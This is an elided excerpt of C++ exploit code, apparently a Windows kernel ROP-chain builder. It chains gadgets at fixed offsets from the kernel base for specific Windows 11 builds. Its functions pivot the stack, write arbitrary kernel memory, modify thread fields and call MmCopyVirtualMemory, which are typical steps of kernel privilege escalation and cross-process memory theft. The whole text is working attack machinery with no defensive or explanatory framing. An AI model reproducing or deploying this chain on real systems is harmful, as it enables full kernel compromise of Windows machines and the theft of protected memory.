...
{
	const std::uint64_t GadgetAddress = Globals::KernelBase + GadgetOffset;
...
{
    this->SetRaxRcxRdx(ReadAddress, 0, (std::uint64_t)KernelMemory->DummyMemoryAllocation);
...
{
    this->AddGadget(0x283c45, "mov rax, qword ptr \[rax\]; ret;");
}

void StackManager::PivotToR11()
{
    this->AddGadget(0x538d8a, "mov rsp, r11; ret;");
}
...
void StackManager::MovRaxIntoR9()
{
    ...
    this->AddGadget(0x430c36, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
...
{
    this->AddGadget(0x607e9d, "mov r8, rax; mov rax, r8; (add rsp, 0x28; )?ret;");
    this->AddPadding(0x28);
}
...
void StackManager::MovRaxIntoRdx()
{
    ...
    if (Globals::WindowsBuild == WINVER_WIN11_25H2 || Globals::WindowsBuild == WINVER_WIN11_24H2)
    {
        ...
        this->AddGadget(0x24edd8, "push rax; pop rbx; ret;");
        ...
        this->SetRax(Globals::KernelBase + 0x24ec89); // add rsp, 8; ret;
        this->AddGadget(0x52e0c8, "mov rdx, rbx; call rax;.*");
        return;
    }
...
void StackManager::SetR9(const std::uint64_t NewR9Value)
{
    ...
    this->AddGadget(0x51d20a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
}

void StackManager::SetRax(const std::uint64_t NewRaxValue)
{
    this->AddGadget(0x2e8637, "mov rax, qword ptr \[rsp \+ 0x30\]; add rsp, 0x48; ret;");
...
void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
{
	...
	this->AddGadget(0x2b9eac, "add rax, rcx; ret;");
	this->AddGadget(0x4046d7, "mov qword ptr \[rax\], r9; ret;");
}
...
void StackManager::CallMmCopyVirtualMemory(void* SourceProcess, void* SourceAddress, void* TargetProcess, void* TargetAddress, int PreviousMode, const std::size_t BufferSize, void* ReturnSize)
{
    ...
    this->AddGadget(0x21497f, "mov rax, rdx; ret;");
    this->MovRaxIntoR9();
    // third arg
    ...
    this->AddGadget(0x202f35, "add rsp, 0x38; ret;");
    // shadow space
...
void StackManager::PivotToNewStack(StackManager& NewStack)
{
    ...
    this->ReadRaxIntoRax();
    this->AddGadget(0x43f2fd, "mov qword ptr \[rdx\], rax; ret;");
    ...
    this->AddGadget(0x473a2f, "xchg ecx, eax; ret;");
    // restore the old value of rax into rax from rbx
    this->AddGadget(0x574422, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
    ...
    this->AddGadget(0xa9c26d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
    // r11=rcx
    this->AddGadget(0x572c07, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr \[rax\]; je 0x......; mov eax, 0xc000000d; ret;");
    ...
    this->AddGadget(0x446d88, "xor qword ptr \[rdx\], rax; ret;");
